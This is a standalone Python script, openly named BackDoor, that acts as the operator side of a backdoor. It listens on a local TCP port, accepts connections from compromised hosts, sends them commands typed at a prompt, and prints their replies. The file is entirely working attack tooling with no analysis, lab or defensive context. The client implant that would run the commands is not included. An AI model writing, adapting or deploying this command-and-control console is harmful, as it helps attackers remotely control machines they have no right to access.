#!/usr/bin/python3

import socket
import threading
import sys

class BackDoor():
    def __init__(self):
        self.HOST = '127.0.0.1'
        self.PORT = 4001
        self.KEEP_GOING = True
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind((self.HOST, self.PORT))
        self.s.listen()

    def main(self):
        self.print_msg('Server started')

        while self.KEEP_GOING:
            client, address = self.s.accept()

            self.print_msg(f'New connection: {str(address)}')

            send_thread = threading.Thread(group=None, target=self.send, args=(client, address), daemon=True)
            send_thread.start()

            receive_thread = threading.Thread(group=None, target=self.receive, args=(client, address), daemon=True)
            receive_thread.start()

    def send(self, client, address):
        while self.KEEP_GOING:
            try:
                cmd = input(f'{address}>>>: ')
                client.send(cmd.encode('utf-8'))
            except:
                self.print_msg('Failed to send command to client')
                self.KEEP_GOING = False

    def receive(self, client, address):
        while self.KEEP_GOING:
            try:
                data = client.recv(1024).decode('utf-8')

                if not data or 'closed' in data:
                    self.print_msg(f'Connection with host: {address} closed')
                    self.KEEP_GOING = False

                print(f'{address}>>>: {data}')
                self.print_msg(f'{address}>>>: Enter a new command')
            except:
                self.print_msg(f'Failed to receive data from host: {address}')
                self.KEEP_GOING = False

    def print_msg(self, msg):
        print(f'[*] {msg} [*]')

if __name__ == '__main__':
    bd = BackDoor()
    bd.main()